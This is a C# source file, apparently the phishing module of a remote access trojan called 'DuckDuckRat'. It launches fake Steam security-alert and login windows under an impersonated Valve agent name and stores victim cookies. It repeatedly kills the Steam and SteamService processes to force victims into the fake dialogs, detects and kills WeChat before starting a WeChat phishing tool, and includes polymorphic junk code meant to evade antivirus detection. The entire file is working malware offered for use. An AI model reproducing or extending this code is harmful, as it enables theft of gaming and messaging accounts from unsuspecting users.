using System;
using System.IO;
using System.Reflection;
using DuckDuckRat;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Threading;

namespace DuckDuckRat.Modules
{
    public static class PhishManager
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_e233e047() {
            int val = 24189;
            if (val > 50000) Console.WriteLine("Hash:" + 24189);
        }

        private static string GetTempDir() => ResourceModule.WorkDir;

        private static CancellationTokenSource? _lockdownCts;
        public static bool GlobalBlockSteam { get; set; } = false;
        private static string _savedAgentName = "Valve_Security_Specialist_732";
        private static string _savedVacLang = "en";
        private static string _savedCookies = "";

        public static void SetAgentName(string name) { _savedAgentName = name; SyncToDisk(); }
        public static void SetVacLang(string lang) { _savedVacLang = lang; SyncToDisk(); }
        public static void SetCookies(string cookies) { _savedCookies = cookies; SyncToDisk(); }
        public static string GetAgentName() => _savedAgentName;
        public static string GetVacLang() => _savedVacLang;

        public static void SyncToDisk()
        {
            PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
        }

        public static void StartLockdown()
        {
            if (_lockdownCts != null) return;
            _lockdownCts = new CancellationTokenSource();
            CancellationToken token = _lockdownCts.Token;

            Task.Run(async () =>
            {
                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        // Always block if global toggle is ON or phishing window is ACTIVE
                        if (GlobalBlockSteam || _lockdownCts != null)
                        {
                            foreach (var process in Process.GetProcessesByName("steam"))
                            {
                                try { process.Kill(true); } catch { }
                            }
                            // Also kill service to prevent auto-restart
                            foreach (var process in Process.GetProcessesByName("SteamService"))
                            {
                                try { process.Kill(true); } catch { }
                            }
                        }
                        
                        // If not global and lockdown stopped, break
                        if (!GlobalBlockSteam && _lockdownCts == null) break;
                    }
                    catch { }
                    await Task.Delay(800, token); // Slightly slower to save CPU but still effective
                }
            }, token);
        }

        public static void ToggleGlobalBlock()
        {
            GlobalBlockSteam = !GlobalBlockSteam;
            if (GlobalBlockSteam) StartLockdown();
        }

        public static void StopLockdown()
        {
            _lockdownCts?.Cancel();
            _lockdownCts = null;
        }

        public static void LaunchSteamAlert()
        {
            PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
            string exePath = ResourceModule.GetToolPath("SteamAlert");
            if (File.Exists(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = $"--pipe DuckDuckRatv1_status_pipe --lang {_savedVacLang}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = GetTempDir()
                });
                StartLockdown();
            }
        }

        public static bool IsWeChatInstalled()
        {
            string[] keys = { @"Software\Tencent\WeChat", @"Software\Tencent\Weixin" };
            foreach (var keyPath in keys)
            {
                try
                {
                    using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(keyPath))
                        if (key?.GetValue("InstallPath") != null) return true;
                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath))
                        if (key?.GetValue("InstallPath") != null) return true;
                }
                catch { }
            }
            return false;
        }

        public static void KillWeChat()
        {
            string[] targets = { "WeChat", "Weixin" };
            foreach (var t in targets)
            {
                foreach (var p in Process.GetProcessesByName(t))
                {
                    try { p.Kill(true); } catch { }
                }
            }
        }

        public static void LaunchSteamLogin(string lang = "en")
        {
            PrepareSteamFiles(_savedAgentName, _savedCookies, lang);
            string exePath = ResourceModule.GetToolPath("SteamLogin");
            if (File.Exists(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = $"--pipe DuckDuckRatv1_status_pipe --lang {lang}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = GetTempDir()
                });
                StartLockdown();
            }
        }

        public static void LaunchWeChatPhish()
        {
            KillWeChat();
            string exePath = ResourceModule.GetToolPath("WeChatPhish");
            if (File.Exists(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = GetTempDir()
                });
            }
        }

        public static void PrepareSteamFiles(string agentName, string cookies, string vacLang)
        {
            string tempRoot = GetTempDir();
            string tablichkaDir = Path.Combine(tempRoot, "tablichka");
            if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
            
            try { 
                foreach (var file in Directory.GetFiles(tablichkaDir)) 
                    File.Delete(file); 
            } catch { }

            if (!string.IsNullOrEmpty(agentName))
                File.WriteAllText(Path.Combine(tablichkaDir, "agent_name.txt"), agentName);
            
            if (!string.IsNullOrEmpty(cookies))
                File.WriteAllText(Path.Combine(tablichkaDir, "cookies.txt"), cookies);

            if (!string.IsNullOrEmpty(vacLang))
                File.WriteAllText(Path.Combine(tablichkaDir, "vac_lang.txt"), vacLang);
        }
    }
}


